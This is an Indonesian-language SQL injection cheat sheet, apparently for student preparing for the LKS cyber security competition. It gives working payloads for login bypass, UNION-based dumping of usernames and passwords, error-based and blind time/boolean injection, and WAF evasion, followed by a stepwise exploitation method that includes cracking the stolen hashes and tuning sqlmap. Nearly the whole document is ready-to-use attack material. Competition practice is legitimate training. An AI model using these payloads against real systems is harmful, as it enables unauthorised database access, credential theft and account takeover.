## Authentication Bypass - Digunakan untuk melewati form login tanpa password yang valid.sql
```
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' #
admin' --
admin' #
' OR 1=1 --
" OR "1"="1
```

## UNION-Based SQLi - Digunakan untuk mengekstrak data dari tabel lain.
```
-- Cari jumlah kolom dulu
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --   ← sampai error = jumlah kolom ketemu

-- Cari kolom yang tampil di halaman
' UNION SELECT NULL, NULL, NULL --
' UNION SELECT 1, 2, 3 --

-- Ambil nama database
' UNION SELECT database(), NULL, NULL --

-- Ambil nama tabel
' UNION SELECT table_name, NULL, NULL FROM information_schema.tables WHERE table_schema=database() --

-- Ambil nama kolom dari tabel tertentu
' UNION SELECT column_name, NULL, NULL FROM information_schema.columns WHERE table_name='users' --

-- Dump data
' UNION SELECT username, password, NULL FROM users --
```
## Error-Based SQLi - Memaksa database menampilkan error yang berisi informasi.
```
' AND EXTRACTVALUE(1, CONCAT(0x7e, database())) --
' AND UPDATEXML(1, CONCAT(0x7e, database()), 1) --
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(database(), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a) --
```
## Blind SQLi (Boolean & Time-Based) - Digunakan saat tidak ada output yang tampil di halaman.
```
-- Boolean-based
' AND 1=1 --   ← TRUE (halaman normal)
' AND 1=2 --   ← FALSE (halaman berubah)
' AND SUBSTRING(database(),1,1)='a' --

-- Time-based
' AND SLEEP(5) --
' AND IF(1=1, SLEEP(5), 0) --
' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0) --
```
## Filter Bypass (WAF Evasion) - Jika ada filter karakter tertentu, coba teknik ini.
```
-- Pakai komentar untuk bypass spasi
'/**/UNION/**/SELECT/**/1,2,3--

-- Pakai encoding hex
' UNION SELECT 0x61646d696e, NULL --   (hex dari 'admin')

-- Huruf campur kapital
' uNiOn SeLeCt 1,2,3 --

-- Double URL encode (jika lewat URL)
%27%20OR%20%271%27%3D%271
```
## LKS Cyber Security (SQLi)

## 1. Selalu mulai dengan deteksi dulu
Coba masukkan karakter ' atau " di semua field input (username, password, search, URL parameter). Kalau muncul error SQL atau halaman berubah, itu tandanya vulnerable. Jangan langsung pakai payload besar sebelum tahu titik injeksinya.
## 2. Tentukan jenis SQLi sebelum eksploitasi
Kalau ada output data di halaman → pakai UNION-based. Kalau halaman cuma berubah benar/salah → pakai Boolean-based Blind. Kalau tidak ada perubahan sama sekali → pakai Time-based Blind dengan SLEEP(5). Salah pilih jenis bisa buang waktu banyak.
## 3. Cari jumlah kolom dulu sebelum UNION
Ini wajib sebelum pakai UNION SELECT. Mulai dari ORDER BY 1 --, naikkan angkanya satu-satu sampai muncul error. Angka sebelum error = jumlah kolom. Kalau 3 kolom, berarti pakai UNION SELECT 1,2,3 --.
## 4. Gunakan information_schema untuk mapping database
Di kompetisi, kamu tidak tahu nama tabel dan kolomnya. Selalu ekstrak dari information_schema.tables dan information_schema.columns. Urutannya: cari nama database → nama tabel → nama kolom → baru dump datanya.
## 5. Kalau ada filter, jangan langsung menyerah
Coba bypass dengan komentar (/**/ untuk ganti spasi), huruf campur kapital (UnIoN SeLeCt), atau encoding hex. WAF biasanya hanya filter pola tertentu, bukan semua variasinya.
## 6. Hash yang didapat langsung coba crack
Password di database hampir selalu di-hash (MD5, SHA1, bcrypt). Begitu dapat hash, langsung buka CrackStation.net atau hashes.com. Di LKS biasanya pakai hash yang memang bisa di-crack, jadi jangan skip langkah ini.
## 7. Pakai sqlmap kalau memang diizinkan
Kalau soalnya tidak melarang tools otomatis, sqlmap -u "URL" --dbs bisa menghemat waktu banyak. Tapi tetap pahami cara manualnya karena kadang soal LKS punya filter yang bikin sqlmap perlu di-tuning dulu dengan flag tambahan seperti --tamper atau --level=5.
